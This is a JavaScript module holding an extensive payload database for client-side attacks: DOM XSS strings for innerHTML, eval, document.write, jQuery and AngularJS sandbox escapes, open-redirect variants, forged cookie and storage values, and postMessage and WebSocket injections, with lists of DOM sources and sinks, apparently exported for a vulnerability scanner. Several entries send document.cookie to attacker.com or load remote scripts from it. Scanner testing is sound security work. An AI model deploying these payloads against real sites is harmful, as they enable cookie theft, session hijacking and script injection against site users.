// DOM-based Vulnerability Payloads
// Comprehensive payload database for DOM XSS, open redirect, and other client-side attacks

const DOMPayloads = {
    // DOM XSS Payloads
    domXSS: {
        innerHTML: [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<img src=x onerror="alert(String.fromCharCode(88,83,83))">',
            '<svg><script>alert(1)</script></svg>',
            '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<input onfocus=alert(1) autofocus>'
        ],

        eval: [
            'alert(1)',
            'alert(document.domain)',
            'alert(document.cookie)',
            'console.log(document.cookie)',
            'fetch("//attacker.com?c="+document.cookie)',
            'new Image().src="//attacker.com?c="+document.cookie',
            'window.location="//attacker.com?c="+document.cookie',
            'eval(atob("YWxlcnQoMSk="))',
            'Function("alert(1)")()',
            'setTimeout("alert(1)",0)'
        ],

        documentWrite: [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<script src=//attacker.com/xss.js></script>',
            '<link rel=stylesheet href=//attacker.com/xss.css>',
            '<base href=//attacker.com/>',
            '<form action=//attacker.com><input name=x value=y></form>',
            '<meta http-equiv=refresh content="0;url=//attacker.com">'
        ],

        jQuery: [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<img src=x onerror=$.getScript("//attacker.com/xss.js")>',
            '<div onclick=alert(1)>Click me</div>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus><option>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video><source onerror=alert(1)>'
        ],

        angularJS: [
            '{{constructor.constructor("alert(1)")()}}',
            '{{$on.constructor("alert(1)")()}}',
            '{{$eval.constructor("alert(1)")()}}',
            '{{a="alert";b="(1)";a.concat(b)}}',
            '{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}',
            '{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}',
            '{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}',
            '{{a=toString().constructor.prototype;a.charAt=a.trim;$eval("a,alert(1),a")}}',
            '{{{}[{toString:[].join,length:1,0:"__proto__"}].assign=[].join;constructor.constructor("alert(1)")()}}',
            '{{toString.constructor.prototype.charAt=[].join;$eval("x=alert(1)");}}'
        ]
    },

    // Open Redirect Payloads
    openRedirect: [
        'javascript:alert(1)',
        'javascript:alert(document.domain)',
        '//attacker.com',
        'https://attacker.com',
        '//attacker.com@victim.com',
        '/\\attacker.com',
        '//attacker.com%2f@victim.com',
        'https://victim.com.attacker.com',
        'https://victim.com@attacker.com',
        'https://attacker.com?victim.com',
        'https://attacker.com#victim.com',
        'https://attacker.com/victim.com',
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'vbscript:msgbox(1)',
        'javascript://%0aalert(1)',
        'javascript://%0d%0aalert(1)',
        'javascript://victim.com%0aalert(1)',
        'javascript:alert(1)//victim.com',
        'javascript:alert(1);'
    ],

    // Cookie Manipulation Payloads
    cookieManipulation: [
        'admin=true',
        'role=administrator',
        'isAdmin=1',
        'user=admin',
        'loggedin=true',
        'session=hijacked',
        'token=forged',
        'csrf=bypassed',
        'authenticated=yes',
        'privilege=elevated'
    ],

    // Web Storage Payloads
    webStorage: [
        '{"admin":true}',
        '{"role":"administrator"}',
        '{"isAdmin":1}',
        '{"user":"admin"}',
        '{"token":"<script>alert(1)</script>"}',
        '{"data":"<img src=x onerror=alert(1)>"}',
        '{"html":"<svg onload=alert(1)>"}',
        '{"redirect":"javascript:alert(1)"}',
        '{"url":"//attacker.com"}',
        '{"payload":"eval(atob(\\"YWxlcnQoMSk=\\"))"}'
    ],

    // AJAX Injection Payloads
    ajaxInjection: [
        '"><script>alert(1)</script>',
        '\'><script>alert(1)</script>',
        '<script>alert(1)</script>',
        '{"success":true,"data":"<script>alert(1)</script>"}',
        '{"html":"<img src=x onerror=alert(1)>"}',
        '{"redirect":"javascript:alert(1)"}',
        '{"callback":"alert(1)"}',
        '{"jsonp":"alert(1)"}',
        '{"eval":"alert(1)"}',
        '{"code":"alert(1)"}'
    ],

    // WebSocket Payloads
    webSocket: [
        '{"type":"message","data":"<script>alert(1)</script>"}',
        '{"action":"eval","code":"alert(1)"}',
        '{"cmd":"alert(1)"}',
        '{"html":"<img src=x onerror=alert(1)>"}',
        '{"redirect":"javascript:alert(1)"}',
        '{"xss":"<svg onload=alert(1)>"}',
        '{"payload":"eval(atob(\\"YWxlcnQoMSk=\\"))"}',
        '{"script":"alert(document.domain)"}',
        '{"injection":"<iframe src=javascript:alert(1)>"}',
        '{"attack":"<body onload=alert(1)>"}'
    ],

    // PostMessage Payloads
    postMessage: [
        '{"type":"xss","data":"<script>alert(1)</script>"}',
        '{"action":"eval","code":"alert(1)"}',
        '{"html":"<img src=x onerror=alert(1)>"}',
        '{"redirect":"javascript:alert(1)"}',
        '{"message":"<svg onload=alert(1)>"}',
        '{"payload":"eval(atob(\\"YWxlcnQoMSk=\\"))"}',
        '{"script":"alert(document.domain)"}',
        '{"origin":"*","data":"<script>alert(1)</script>"}',
        '{"targetOrigin":"*","message":"<img src=x onerror=alert(1)>"}',
        '{"command":"alert(1)"}'
    ],

    // Hash Fragment Payloads
    hashFragment: [
        '#<script>alert(1)</script>',
        '#<img src=x onerror=alert(1)>',
        '#<svg onload=alert(1)>',
        '#<iframe src=javascript:alert(1)>',
        '#javascript:alert(1)',
        '#data:text/html,<script>alert(1)</script>',
        '#//attacker.com',
        '#{"xss":"<script>alert(1)</script>"}',
        '#eval(atob("YWxlcnQoMSk="))',
        '#alert(1)'
    ],

    // URL Parameter Payloads
    urlParameter: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        '//attacker.com',
        '"><script>alert(1)</script>',
        '\'><script>alert(1)</script>',
        'eval(atob("YWxlcnQoMSk="))'
    ]
};

// DOM Sources (user-controllable input)
const DOMSources = [
    'document.URL',
    'document.documentURI',
    'document.baseURI',
    'location',
    'location.href',
    'location.search',
    'location.hash',
    'location.pathname',
    'document.referrer',
    'document.cookie',
    'window.name',
    'history.pushState',
    'history.replaceState',
    'localStorage',
    'sessionStorage',
    'postMessage'
];

// DOM Sinks (dangerous operations)
const DOMSinks = {
    execution: [
        'eval',
        'Function',
        'setTimeout',
        'setInterval',
        'setImmediate',
        'execScript',
        'crypto.generateCRMFRequest'
    ],

    htmlManipulation: [
        'innerHTML',
        'outerHTML',
        'insertAdjacentHTML',
        'document.write',
        'document.writeln'
    ],

    domManipulation: [
        'element.setAttribute',
        'element.src',
        'element.href',
        'element.action',
        'element.formaction',
        'element.data'
    ],

    navigation: [
        'location',
        'location.href',
        'location.assign',
        'location.replace',
        'window.open',
        'window.location'
    ],

    jquery: [
        '$.html',
        '$.parseHTML',
        '$.append',
        '$.prepend',
        '$.after',
        '$.before',
        '$.replaceWith',
        '$.wrap',
        '$.wrapAll',
        '$.wrapInner',
        '$.globalEval',
        '$.getScript'
    ]
};

// Helper functions
function getPayloadsByType(type) {
    if (type === 'domXSS') {
        return Object.values(DOMPayloads.domXSS).flat();
    }
    return DOMPayloads[type] || [];
}

function getAllDOMPayloads() {
    const allPayloads = [];

    // DOM XSS payloads
    Object.values(DOMPayloads.domXSS).forEach(category => {
        allPayloads.push(...category);
    });

    // Other payload types
    Object.keys(DOMPayloads).forEach(key => {
        if (key !== 'domXSS' && Array.isArray(DOMPayloads[key])) {
            allPayloads.push(...DOMPayloads[key]);
        }
    });

    return allPayloads;
}

function getPayloadCount() {
    return getAllDOMPayloads().length;
}

function getSinksByCategory(category) {
    return DOMSinks[category] || [];
}

function getAllSinks() {
    return Object.values(DOMSinks).flat();
}

// Export for use in scanner
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        DOMPayloads,
        DOMSources,
        DOMSinks,
        getPayloadsByType,
        getAllDOMPayloads,
        getPayloadCount,
        getSinksByCategory,
        getAllSinks
    };
}
